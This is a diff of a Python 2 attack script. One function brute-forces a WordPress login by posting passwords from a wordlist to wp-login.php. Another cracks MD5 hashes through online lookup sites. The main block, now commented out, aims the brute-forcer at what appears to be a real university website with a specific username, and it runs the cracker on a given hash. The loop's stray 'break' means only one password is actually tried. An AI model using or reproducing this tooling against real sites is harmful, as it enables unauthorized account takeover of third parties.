@@ -13,19 +13,20 @@ import urllib2
 import re
 
 def bruteforce_wordpress(url, name, result):
-    pwd = '/root/weak.txt'
-    #pwd = 'D:\\weak.txt'
+    #pwd = '/root/weak.txt'
+    pwd = 'D:\\weak.txt'
     for line in open(pwd):
         lineline = line.strip().replace('\n', '')
-        print lineline
-        data = urllib.urlencode({'log':name,'pwd':lineline,'redirect_to':''})
-        content = urllib.urlopen(url, data)
+        data = urllib.urlencode({'log':name,'pwd':lineline,'redirect_to':'', 'wp-submit':'%E7%99%BB%E5%BD%95', 'testcookie':'1'})
+        request = urllib2.Request(url, data)
+        content = urllib2.urlopen(request)
         if content.read() == '':
             result.bruteforce_wordpress = lineline
             return
         break
-    data = urllib.urlencode({'log':name,'pwd':name,'redirect_to':''})
-    content = urllib.urlopen(url, data)
+    data = urllib.urlencode({'log':name,'pwd':name,'redirect_to':'', 'wp-submit':'%E7%99%BB%E5%BD%95', 'testcookie':'1'})
+    request = urllib2.Request(url, data)
+    content = urllib2.urlopen(request)
     if content.read() == '':
         result.bruteforce_wordpress = name
         return
@@ -84,7 +85,6 @@ def md5_md5cc(md5):
     target = 'http://www.md5.cc//ShowMD5Info.asp?GetType=ShowInfo&no-cache=0.730324269970879&md5_str=' + md5 + '&_='
     response = opener.open(target)
     content = response.read()
-    print content
     m = re.search(r'>([a-zA-Z0-9]*?)</span>', content)
     if m:
         return m.group(1)
@@ -92,9 +92,9 @@ def md5_md5cc(md5):
         return 'Not Found'
 
 def md5_crack(md5, result):
-    result['www.2d5.net'] = md5_2d5(md5)
-    result['www.somd5.com'] = md5_somd5(md5)
-    result['www.md5.cc'] = md5_md5cc(md5)
+    result.bruteforce_md5['www.2d5.net'] = md5_2d5(md5)
+    result.bruteforce_md5['www.somd5.com'] = md5_somd5(md5)
+    result.bruteforce_md5['www.md5.cc'] = md5_md5cc(md5)
 
     #print md5_2d5(md5)
     #print md5_somd5(md5)
@@ -109,6 +109,8 @@ if __name__ == '__main__':
     #    print status
     #    if status == 'Done':
     #        break
-    #md5_crack('47BCE5C74F589F4867DBD57E9CA9F8E8')
-    bruteforce_wordpress('http://jwjcc.bfsu.edu.cn/wp-login.php', 'jwjcc', r)
-    print r.bruteforce_wordpress
+    md5_crack('47BCE5C74F589F4867DBD57E9CA9F8E8', r)
+    for key in r.bruteforce_md5.keys():
+        print key + '|' + r.bruteforce_md5[key]
+    #bruteforce_wordpress('http://jwjcc.bfsu.edu.cn/wp-login.php', 'jwjcc', r)
+    #print r.bruteforce_wordpress
